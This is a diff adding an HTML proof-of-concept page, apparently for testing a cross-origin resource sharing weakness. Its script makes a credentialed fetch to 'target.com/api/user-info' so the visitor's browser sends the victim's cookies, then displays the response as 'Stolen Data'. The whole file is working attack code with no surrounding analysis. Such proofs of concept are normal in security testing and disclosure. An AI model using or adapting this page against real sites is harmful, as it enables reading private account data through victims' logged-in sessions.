@@ -1,0 +1,12 @@
+<html>
+  <body>
+    <script>
+      fetch("https://target.com/api/user-info", {
+          credentials: "include"  // This forces the browser to send victim’s cookies
+      })
+      .then(response => response.text())  // Read response
+      .then(data => alert("Stolen Data: " + data)) // Display stolen data
+      .catch(err => console.log("Exploit failed", err));
+    </script>
+  </body>
+</html>
